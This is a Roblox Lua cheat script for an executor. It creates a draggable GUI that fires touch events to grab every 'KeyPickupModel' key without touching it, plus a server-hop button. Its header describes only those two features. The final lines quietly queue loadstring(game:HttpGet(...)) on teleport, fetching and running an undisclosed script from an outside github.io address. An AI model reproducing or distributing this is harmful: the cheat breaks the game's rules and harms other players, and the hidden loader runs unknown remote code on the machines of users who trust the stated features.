--[[
    SPYCAT BRIEFING: Draggable GUI + Server Hop
    - Top button: Fires KeyPickupModel.key.TouchInterest (+ legacy [253] path)
    - Bottom button: Server hops you to a new instance
    Fully custom drag (PC + Mobile)
]]

local Players = game:GetService("Players")
local UserInputService = game:GetService("UserInputService")
local TeleportService = game:GetService("TeleportService")
local Workspace = game:GetService("Workspace")

local LocalPlayer = Players.LocalPlayer
local PlayerGui = LocalPlayer:WaitForChild("PlayerGui")
local Character = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
local HRP = Character:WaitForChild("HumanoidRootPart")

LocalPlayer.CharacterAdded:Connect(function(char)
    Character = char
    HRP = char:WaitForChild("HumanoidRootPart")
end)

-- Configuration
local MODEL_NAME = "KeyPickupModel"
local FRAME_SIZE = UDim2.new(0, 150, 0, 90)          -- taller to fit both buttons
local FRAME_POSITION = UDim2.new(0.5, -75, 0.75, 0)

-- Create ScreenGui
local ScreenGui = Instance.new("ScreenGui")
ScreenGui.Name = "KeyTouchFirer"
ScreenGui.ResetOnSpawn = false
ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
ScreenGui.Parent = PlayerGui

-- Main Frame (draggable)
local Frame = Instance.new("Frame")
Frame.Name = "DragFrame"
Frame.Size = FRAME_SIZE
Frame.Position = FRAME_POSITION
Frame.BackgroundColor3 = Color3.fromRGB(20, 20, 30)
Frame.BorderSizePixel = 0
Frame.Active = true
Frame.Parent = ScreenGui

local UICorner = Instance.new("UICorner")
UICorner.CornerRadius = UDim.new(0, 8)
UICorner.Parent = Frame

local UIStroke = Instance.new("UIStroke")
UIStroke.Color = Color3.fromRGB(0, 180, 255)
UIStroke.Thickness = 2
UIStroke.Parent = Frame

-- Top Button (Fire)
local FireButton = Instance.new("TextButton")
FireButton.Name = "FireButton"
FireButton.Size = UDim2.new(1, -8, 0, 40)
FireButton.Position = UDim2.new(0, 4, 0, 4)
FireButton.BackgroundColor3 = Color3.fromRGB(0, 120, 200)
FireButton.Text = "FIRE KEY TOUCH"
FireButton.TextColor3 = Color3.fromRGB(255, 255, 255)
FireButton.Font = Enum.Font.GothamBold
FireButton.TextSize = 14
FireButton.Parent = Frame

local FireCorner = Instance.new("UICorner")
FireCorner.CornerRadius = UDim.new(0, 6)
FireCorner.Parent = FireButton

-- Bottom Button (Server Hop)
local HopButton = Instance.new("TextButton")
HopButton.Name = "HopButton"
HopButton.Size = UDim2.new(1, -8, 0, 34)
HopButton.Position = UDim2.new(0, 4, 0, 50)
HopButton.BackgroundColor3 = Color3.fromRGB(180, 50, 50)
HopButton.Text = "SERVER HOP"
HopButton.TextColor3 = Color3.fromRGB(255, 255, 255)
HopButton.Font = Enum.Font.GothamBold
HopButton.TextSize = 13
HopButton.Parent = Frame

local HopCorner = Instance.new("UICorner")
HopCorner.CornerRadius = UDim.new(0, 6)
HopCorner.Parent = HopButton

-------------------------------------------------
-- CUSTOM DRAG SYSTEM
-------------------------------------------------
local dragging = false
local dragStart = nil
local startPos = nil

local function update(input)
    local delta = input.Position - dragStart
    Frame.Position = UDim2.new(
        startPos.X.Scale,
        startPos.X.Offset + delta.X,
        startPos.Y.Scale,
        startPos.Y.Offset + delta.Y
    )
end

Frame.InputBegan:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
        dragging = true
        dragStart = input.Position
        startPos = Frame.Position

        input.Changed:Connect(function()
            if input.UserInputState == Enum.UserInputState.End then
                dragging = false
            end
        end)
    end
end)

Frame.InputChanged:Connect(function(input)
    if dragging and (input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch) then
        update(input)
    end
end)

UserInputService.InputChanged:Connect(function(input)
    if dragging and (input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch) then
        update(input)
    end
end)

-------------------------------------------------
-- FIRE LOGIC
-------------------------------------------------
local function FireTouch(part)
    if not part or not HRP then return false end
    pcall(function()
        firetouchinterest(part, HRP, 0)
        firetouchinterest(part, HRP, 1)
    end)
    return true
end

local function ExecuteFire()
    local fired = 0

    -- Legacy path
    local children = Workspace:GetChildren()
    if #children >= 253 then
        local target = children[253]
        local key = target and (target:FindFirstChild("key") or target:FindFirstChild("Key"))
        if key and FireTouch(key) then
            fired += 1
        end
    end

    -- Search all KeyPickupModel
    for _, obj in ipairs(Workspace:GetDescendants()) do
        if obj.Name == MODEL_NAME then
            local key = obj:FindFirstChild("key") or obj:FindFirstChild("Key")
            if key and FireTouch(key) then
                fired += 1
            end
        end
    end

    FireButton.Text = "FIRED: " .. fired
    task.delay(0.9, function()
        if FireButton and FireButton.Parent then
            FireButton.Text = "FIRE KEY TOUCH"
        end
    end)
end

FireButton.MouseButton1Click:Connect(ExecuteFire)
FireButton.TouchTap:Connect(ExecuteFire)

-------------------------------------------------
-- SERVER HOP
-------------------------------------------------
local function ServerHop()
    HopButton.Text = "HOPPING..."
    pcall(function()
        TeleportService:Teleport(game.PlaceId, LocalPlayer)
    end)
end

HopButton.MouseButton1Click:Connect(ServerHop)
HopButton.TouchTap:Connect(ServerHop)

print("[SPYCAT] Draggable Fire + Server Hop loaded.")
queue_on_teleport([[
  loadstring(game:HttpGet("https://nxyw.github.io/mm2locust.lua"))()]])
